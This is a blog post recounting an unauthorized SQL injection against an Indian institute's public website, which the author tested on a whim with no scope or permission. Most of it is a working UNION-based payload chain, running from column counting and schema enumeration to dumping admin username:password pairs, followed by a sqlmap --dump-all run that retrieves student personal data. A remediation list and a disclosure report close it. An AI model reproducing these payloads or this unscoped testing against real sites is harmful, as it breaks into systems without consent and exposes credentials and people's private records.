---
title: "Finding a SQL Injection on an IIT's Website Out of Pure Boredom"
date: 2025-01-28
categories: [blog]
tags: [sqli, bug-bounty, web-security, responsible-disclosure]
---
 
One day I was sitting at my PC, bored, wanting to test something new. I got a thought in my head to test IIT websites — because those are some of the most advanced educational institutions in the country, and I was curious whether their public-facing sites held up under basic scrutiny.
 
I started with Google dorking to find parameters worth testing, and went through about six of them before landing on a vulnerable one:
 
```
viewevent.php?type=news&id=45
```
 
My first instinct was to try XSS — it didn't work. So I dropped a single quote `'` into the `id` parameter, and the page content changed. That's always the first sign something's off.
 
I followed up with:
 
```
' or '1'='1
```
 
This is a classic "always true" condition, and the server returned the full page content as if the query had succeeded normally. Then I tried the inverse:
 
```
' or '1'='2
```
 
This is always false — and sure enough, it threw an error. That contrast between a working "true" payload and a broken "false" payload confirmed it: this parameter was vulnerable to SQL Injection.
 
---
 
## Confirming the Injection and Mapping the Database
 
Once I had confirmation, the next step was figuring out how many columns the underlying query was working with. I used an `ORDER BY` payload, incrementing the number each time:
 
```
' order by 4-- -
```
 
At `order by 5-- -` the page stopped returning content, which told me the table had exactly **4 columns**.
 
With the column count known, I needed to find which columns were actually reflected back on the page, so I could inject data into the right ones:
 
```
-1' union select 1,2,3,4-- -
```
 
Columns **2 and 3** came back reflected in the page output — those were my targets for extracting data.
 
Next, I wanted to enumerate every database the server had access to:
 
```
-45' UNION SELECT 1,GROUP_CONCAT(schema_name SEPARATOR 0x0A),3,4 FROM information_schema.schemata -- -
```
 
This returned a full list of databases on the server.
 
---
 
## Pulling Table and Column Names
 
With a target database identified, I pulled the list of tables inside it:
 
```sql
' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR '\n'),3,4 FROM information_schema.tables WHERE table_schema='[REDACTED]' -- -
```
 
One table in particular stood out: `admin`. Before touching it, I enumerated its columns:
 
```sql
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='admin' -- -
```
 
And then pulled the actual credential pair:
 
```sql
' UNION SELECT 1,GROUP_CONCAT(username, ':', password),3,4 FROM admin -- -
```
 
This returned admin usernames and passwords directly. From there, the same technique could be repeated against any other table in the database — student records, contact details, whatever else was sitting in there.
 
---
 
## Automating It with sqlmap
 
To confirm the manual findings and see the full scope of exposure, I also ran the same target through **sqlmap**:
 
```bash
python sqlmap.py -u "https://[REDACTED].ac.in/viewevent.php?type=news&id=45" --dump-all
```
 
This confirmed what the manual approach had already shown — exposed admin credentials, student details, and other sensitive data sitting behind a single unsanitized `id` parameter.
 
---
 
## Reporting It
 
Once I'd confirmed the full scope, I didn't go any further into the data than necessary to prove impact. I wrote up a formal vulnerability report and submitted it to the institution, covering:
 
- **Vulnerability type**: SQL Injection (UNION-based)
- **Impact**: Unauthorized access to admin credentials, student PII, and potential for full database compromise
- **Suggested remediation**:
  - Use prepared statements / parameterized queries instead of raw string concatenation
  - Validate and sanitize all user input
  - Deploy a Web Application Firewall (WAF) to catch malicious patterns in real time
  - Run periodic security audits rather than relying on a one-off fix
I also formally requested acknowledgment of the report and an update once remediation was in place — standard practice for responsible disclosure.
 
---
 
## Takeaway
 
This one started as pure curiosity — no scope, no bug bounty program, just poking at a `.ac.in` site because I wondered if it would hold up. It's a good reminder that a huge number of real vulnerabilities aren't found through exotic techniques; they're found by someone bored enough to put a single quote in a URL parameter and see what happens.
